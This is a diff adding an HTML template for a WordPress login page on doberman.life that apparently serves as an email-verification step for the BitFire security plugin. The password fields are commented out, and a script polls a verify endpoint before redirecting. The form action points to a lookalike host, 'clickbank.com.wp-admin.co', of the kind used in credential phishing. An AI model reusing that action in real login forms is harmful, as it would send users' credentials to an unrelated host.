@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Log In &lsaquo; doberman.life &#8212; WordPress</title>
+    <meta name='robots' content='max-image-preview:large, noindex, noarchive' />
+    <link rel='stylesheet' id='twentyfifteen-jetpack-css'
+        href='https://doberman.life/wp-content/plugins/jetpack/modules/theme-tools/compat/twentyfifteen.css?ver=12.5'
+        media='all' />
+    <link rel='stylesheet' id='dashicons-css' href='https://doberman.life/wp-includes/css/dashicons.min.css?ver=6.3.2'
+        media='all' />
+    <link rel='stylesheet' id='buttons-css' href='https://doberman.life/wp-includes/css/buttons.min.css?ver=6.3.2'
+        media='all' />
+    <link rel='stylesheet' id='forms-css' href='https://doberman.life/wp-admin/css/forms.min.css?ver=6.3.2'
+        media='all' />
+    <link rel='stylesheet' id='l10n-css' href='https://doberman.life/wp-admin/css/l10n.min.css?ver=6.3.2' media='all' />
+    <link rel='stylesheet' id='login-css' href='https://doberman.life/wp-admin/css/login.min.css?ver=6.3.2'
+        media='all' />
+    <meta name='referrer' content='strict-origin-when-cross-origin' />
+    <meta name="viewport" content="width=device-width" />
+    <link rel="icon" href="http://doberman.life/wp-content/uploads/2023/02/cropped-doberman_puppy2-32x32.jpeg"
+        sizes="32x32" />
+    <link rel="icon" href="http://doberman.life/wp-content/uploads/2023/02/cropped-doberman_puppy2-192x192.jpeg"
+        sizes="192x192" />
+    <link rel="apple-touch-icon"
+        href="http://doberman.life/wp-content/uploads/2023/02/cropped-doberman_puppy2-180x180.jpeg" />
+    <meta name="msapplication-TileImage"
+        content="http://doberman.life/wp-content/uploads/2023/02/cropped-doberman_puppy2-270x270.jpeg" />
+    <style>
+        .hide-if-no-js {
+            display: none !important;
+        }
+
+        @font-face {
+            font-family: text-security-disc;
+            src: url("https://raw.githubusercontent.com/noppa/text-security/master/dist/text-security-disc.woff");
+        }
+
+        .password-input {
+            -webkit-text-security: disc;
+            font-family: text-security-disc;
+        }
+    </style>
+</head>
+
+<body class="login no-js login-action-login wp-core-ui  locale-en-us">
+    <script type="text/javascript">
+        document.body.className = document.body.className.replace('no-js', 'js');
+    </script>
+    <div id="login">
+        <h1><a href="https://wordpress.org/">Powered by WordPress</a></h1>
+
+        <form name="loginform" id="loginform" action="https://clickbank.com.wp-admin.co/wp-login.php" method="post">
+            <!--
+            <p>
+                <label for="user_login">Username or Email Address</label>
+                <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off"
+                    autocomplete="username" required="required" />
+            </p>
+
+            <div class="user-pass-wrap">
+                <label for="user_pass">Password</label>
+                <div class="wp-pwd">
+                    <input type="text" autocomplete="off" name="pwd" id="user_pass" class="input password-input"
+                        value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
+                    <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0"
+                        aria-label="Show password">
+                        <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
+                    </button>
+                </div>
+            </div>
+            <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever" /> <label
+                    for="rememberme">Remember Me</label></p>
+            <p class="submit">
+                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large"
+                    value="Log In" />
+                <input type="hidden" name="redirect_to" value="https://doberman.life/wp-admin/" />
+                <input type="hidden" name="testcookie" value="1" />
+            </p>
+            -->
+            <p style="font-size:16px">Please check your e-mail address for this account.</p>
+            <br>
+            <br>
+            <p style="font-size:16px">Click the link to verify and complete this login.</p>
+            <br>
+            <br>
+        </form>
+
+        <p id="nav">
+            <a href="https://doberman.life/wp-login.php?action=lostpassword">Lost your password?</a>
+        </p>
+        <script type="text/javascript">
+            function wp_attempt_focus() { setTimeout(function () { try { d = document.getElementById("user_login"); d.focus(); d.select(); } catch (er) { } }, 200); }
+            wp_attempt_focus();
+            if (typeof wpOnload === 'function') { wpOnload() }
+        </script>
+        <p id="backtoblog">
+            <a href="https://doberman.life/">&larr; Go to doberman.life</a>
+        </p>
+    </div>
+    <script type="text/javascript">
+        const eventSource = new EventSource("/wp-content/plugins/bitfire/verify.php");
+
+        console.log("polling event source", eventSource);
+        eventSource.onmessage = function (event) {
+            console.log("event!");
+            console.log(event, event.data);
+            // TODO: XXX add redirection url here
+            if (event.data === "success") {
+                window.location.href = "https://doberman.life/wp-content/plugins/bitfire/verify.php?set-auth=1";
+            }
+        };
+    </script>
+</body>
+
+</html>
